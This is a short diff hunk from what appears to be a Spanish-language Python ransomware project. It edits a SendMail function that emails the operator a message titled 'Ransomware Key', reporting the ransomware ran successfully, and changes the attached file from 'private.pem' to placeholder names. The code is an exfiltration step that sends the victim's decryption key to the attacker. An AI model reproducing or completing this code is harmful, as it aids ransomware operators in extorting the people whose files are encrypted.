@@ -12,8 +12,8 @@ def SendMail():
     destinatarios = ['CORREO']
     asunto = 'Ransomware Key'
     cuerpo = 'Ransomware Ejecutado Con exito!'
-    ruta_adjunto = 'private.pem'
-    nombre_adjunto = 'private.pem'
+    ruta_adjunto = 'NOMBRE_ARCHIVO (RUTA_ARCHIVO)'
+    nombre_adjunto = 'NOMBREARCHIVO'
     mensaje = MIMEMultipart()
  
     mensaje['From'] = remitente
